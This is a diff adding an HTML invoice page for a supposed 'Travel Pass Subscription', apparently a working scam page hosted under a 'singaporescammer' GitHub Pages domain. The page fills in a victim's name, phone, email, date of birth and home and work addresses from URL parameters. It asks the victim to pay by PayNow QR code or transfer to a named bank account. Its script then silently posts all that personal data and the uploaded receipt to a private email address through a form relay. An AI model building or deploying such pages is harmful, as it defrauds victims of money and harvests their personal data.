@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Invoice - Travel Pass</title>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Baloo+2&family=Roboto:wght@300;400;700&display=swap");
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Roboto", sans-serif;
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: linear-gradient(to bottom right, #fff0f6, #ffffff);
+      color: #333;
+      line-height: 1.6;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 800px;
+      margin: auto;
+      padding: 1.5rem 1rem;
+    }
+
+    h1,
+    h2 {
+      text-align: center;
+      color: deeppink;
+      font-family: "Baloo 2", cursive;
+      margin-bottom: 15px;
+      font-size: 2em;
+      text-shadow: 1px 1px 0 #ffcde8;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px auto 30px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      border-radius: 10px;
+      background: white;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+
+    th,
+    td {
+      border: 1px solid #f3cce9;
+      padding: 12px 15px;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    th {
+      background-color: deeppink;
+      color: #fff;
+      font-size: 13px;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .payment-details {
+      background: #fff0f6;
+      border-radius: 0;
+      padding: 24px 20px;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.06);
+      margin: 0;
+      width: 100%;
+    }
+
+    .payment-details h3 {
+      color: deeppink;
+      margin-bottom: 12px;
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .paynow-img {
+      display: block;
+      margin: 0 auto 15px;
+      border: 6px solid #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 14px rgba(0, 0, 0, 0.1);
+      max-width: 280px;
+      height: auto;
+      transition: transform 0.3s ease;
+    }
+
+    .paynow-img:hover {
+      transform: scale(1.03);
+    }
+
+    .upload-btn {
+      display: block;
+      background: linear-gradient(135deg, deeppink, #ff77c0);
+      color: white;
+      padding: 12px 30px;
+      text-align: center;
+      border-radius: 40px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+      margin: 20px auto 0;
+      width: 50%;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      transition: background 0.3s, transform 0.2s;
+    }
+
+    .upload-btn:hover {
+      background: linear-gradient(135deg, #ff1493, #ff91c9);
+      transform: scale(1.05);
+    }
+
+    #receiptForm {
+      display: none;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        padding: 1rem;
+      }
+
+      .upload-btn {
+        width: 100%;
+        font-size: 14px;
+        padding: 12px;
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Invoice</h1>
+    <h2>Travel Pass Subscription</h2>
+    <table>
+      <tr>
+        <th>Description</th>
+        <th>Details</th>
+      </tr>
+      <tr>
+        <td>Full Name</td>
+        <td id="passengerName">Loading...</td>
+      </tr>
+      <tr>
+        <td>Contact Number</td>
+        <td id="contactNumber">Loading...</td>
+      </tr>
+      <tr>
+        <td>Email Address</td>
+        <td id="emailAddress">Loading...</td>
+      </tr>
+      <tr>
+        <td>Date of Birth</td>
+        <td id="selectedDate">Loading...</td>
+      </tr>
+      <tr>
+        <td>Home Address</td>
+        <td id="pickupLocation">Loading...</td>
+      </tr>
+      <tr>
+        <td>Work Address</td>
+        <td id="dropoffLocation">Loading...</td>
+      </tr>
+      <tr>
+        <td>Driver Preference</td>
+        <td id="pickupTime">Loading...</td>
+      </tr>
+      <tr>
+        <td>Ride Preferences</td>
+        <td id="numPassengers">Loading...</td>
+      </tr>
+      <tr>
+        <td>Subscription Pass</td>
+        <td id="F9_Pass">Loading...</td>
+      </tr>
+      <tr>
+        <td>Total Amount</td>
+        <td id="totalAmount" class="highlight-green">Loading...</td>
+      </tr>
+    </table>
+
+    <form id="receiptForm" action="https://formsubmit.co/endgameis21@hotmail.com" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="_subject" value="New Monthly Pass Submission">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://singaporescammer.github.io/hitch/thanks-you.html">
+      <input type="hidden" name="Full Name" id="inputName">
+      <input type="hidden" name="Contact Number" id="inputContact">
+      <input type="hidden" name="Email Address" id="inputEmail">
+      <input type="hidden" name="Date of Birth" id="inputDOB">
+      <input type="hidden" name="Home Address" id="inputHome">
+      <input type="hidden" name="Work Address" id="inputWork">
+      <input type="hidden" name="Driver Preference" id="inputDriver">
+      <input type="hidden" name="Ride Preferences" id="inputRide">
+      <input type="hidden" name="Subscription Pass" id="inputPass">
+      <input type="hidden" name="Total Amount" id="inputAmount">
+      <input type="file" name="receipt" id="receiptUpload" accept="image/*,application/pdf">
+    </form>
+
+    <div class="payment-details">
+      <h3>Payment Instructions</h3>
+      <img src="https://singaporescammer.github.io/hitch/assets/PaynowQRCode.png" class="paynow-img" alt="PayNow QR Code">
+      <div class="paynow-info">
+        <ol>
+          <li>Login to iBanking and select 'Scan and Pay'</li>
+          <li>Choose from Gallery, Select the QR Code.</li>
+          <li>Key in the amount to complete the payment</li>
+        </ol>
+      </div>
+      <h3>Bank Transfer</h3>
+      <div class="bank-info">
+        <strong>Payee Name:</strong> Singxsavor<br>
+        <strong>Bank Name:</strong> DBS BANK<br>
+        <strong>Account Number:</strong> 88532600023329155<br>
+        Once completed, screenshot and upload the receipt below.
+      </div>
+      <button class="upload-btn" onclick="uploadReceipt()">Upload Receipt & Submit</button>
+    </div>
+  </div>
+
+  <script>
+    function uploadReceipt() {
+      const fileInput = document.getElementById("receiptUpload");
+      fileInput.click();
+      fileInput.onchange = () => {
+        if (fileInput.files[0]) {
+          document.getElementById("inputName").value = document.getElementById("passengerName").textContent;
+          document.getElementById("inputContact").value = document.getElementById("contactNumber").textContent;
+          document.getElementById("inputEmail").value = document.getElementById("emailAddress").textContent;
+          document.getElementById("inputDOB").value = document.getElementById("selectedDate").textContent;
+          document.getElementById("inputHome").value = document.getElementById("pickupLocation").textContent;
+          document.getElementById("inputWork").value = document.getElementById("dropoffLocation").textContent;
+          document.getElementById("inputDriver").value = document.getElementById("pickupTime").textContent;
+          document.getElementById("inputRide").value = document.getElementById("numPassengers").textContent;
+          document.getElementById("inputPass").value = document.getElementById("F9_Pass").textContent;
+          document.getElementById("inputAmount").value = document.getElementById("totalAmount").textContent;
+          document.getElementById("receiptForm").submit();
+        }
+      };
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      document.getElementById("selectedDate").textContent = urlParams.get("F4_DOB") || "Not provided";
+      document.getElementById("passengerName").textContent = urlParams.get("F1_Name") || "Not provided";
+      document.getElementById("contactNumber").textContent = urlParams.get("F2_Contact") || "Not provided";
+      document.getElementById("emailAddress").textContent = urlParams.get("F3_Email") || "Not provided";
+      document.getElementById("pickupTime").textContent = urlParams.get("F7_Driver") || "Not provided";
+      document.getElementById("pickupLocation").textContent = urlParams.get("F5_Home") || "Not provided";
+      document.getElementById("dropoffLocation").textContent = urlParams.get("F6_Work") || "Not provided";
+      document.getElementById("numPassengers").textContent = urlParams.get("F8_RidePref") || "Not provided";
+      document.getElementById("F9_Pass").textContent = urlParams.get("F9_Pass") || "Not provided";
+      const totalAmount = urlParams.get("F12_Amount") || "0.00";
+      document.getElementById("totalAmount").textContent = `$${parseFloat(totalAmount).toFixed(2)}`;
+    });
+  </script>
+</body>
+</html>
